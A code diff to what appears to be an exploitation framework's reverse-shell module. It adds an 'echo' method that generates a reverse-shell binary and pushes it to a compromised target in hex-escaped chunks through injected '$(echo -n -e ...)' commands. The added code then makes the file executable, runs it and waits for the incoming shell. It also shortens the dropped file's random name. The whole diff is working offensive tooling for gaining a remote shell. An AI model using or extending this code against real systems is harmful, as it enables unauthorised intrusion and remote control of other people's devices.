@@ -33,6 +33,8 @@ def shell(exploit, architecture="", method="", **params):
 
                 if method == "wget":
                     revshell.wget(binary=params['binary'], location=params['location'])
+                elif method == "echo":
+                    revshell.echo(binary=params['binary'], location=params['location'])
                 elif method == "awk":
                     revshell.awk(binary=params['binary'])
                 elif method == "netcat":
@@ -93,7 +95,7 @@ class reverse_shell(object):
 
     def generate_binary(self, lhost, lport):
         print_status("Generating reverse shell binary")
-        self.binary_name = random_text(32)
+        self.binary_name = random_text(8)
         ip = self.convert_ip(lhost)
         port = self.convert_port(lport)
 
@@ -137,6 +139,32 @@ class reverse_shell(object):
         # waiting for shell
         self.shell(sock)
 
+    def echo(self, binary, location):
+        # generate binary
+        self.generate_binary(self.lhost, self.lport)
+        path = "{}/{}".format(location, self.binary_name)
+
+        size = len(self.revshell) 
+        num_parts = (size / 30) + 1
+
+        # transfer binary through echo command
+        print_status("Using echo method to transfer binary")
+        for i in range(0, num_parts):
+            current = i * 30
+            print_status("Transferring {}/{} bytes".format(current, len(self.revshell)))
+
+            block = self.revshell[current:current+30].encode('hex')
+            block = "\\x" + "\\x".join(a+b for a,b in zip(block[::2], block[1::2]))
+            cmd = '$(echo -n -e "{}" >> {})'.format(block, path)
+            self.exploit.execute(cmd)
+
+        # execute binary
+        sock = self.listen(self.lhost, self.lport)
+        self.execute_binary(location, self.binary_name)
+
+        # waiting for shell
+        self.shell(sock)
+
     def awk(self, binary):
         # run reverse shell through awk
         sock = self.listen(self.lhost, self.lport)
@@ -161,7 +189,7 @@ class reverse_shell(object):
 
     def execute_binary(self, location, binary_name):
         path = "{}/{}".format(location, binary_name)
-        cmd = "chmod +x {}; {} & rm {}".format(path,
+        cmd = "chmod +x {}; {}; rm {}".format(path,
                                                path,
                                                path)
 
